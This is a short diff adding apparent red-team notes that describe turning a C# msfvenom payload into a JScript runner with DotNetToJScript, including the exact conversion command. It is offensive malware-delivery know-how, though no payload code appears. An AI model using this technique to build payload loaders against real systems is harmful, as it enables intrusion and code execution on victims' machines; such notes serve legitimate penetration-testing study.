@@ -1,0 +1,4 @@
+
+# use dontnettojscript to make a .js runner using csharp msvenom payload... use x64 payload.
+
+  * DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
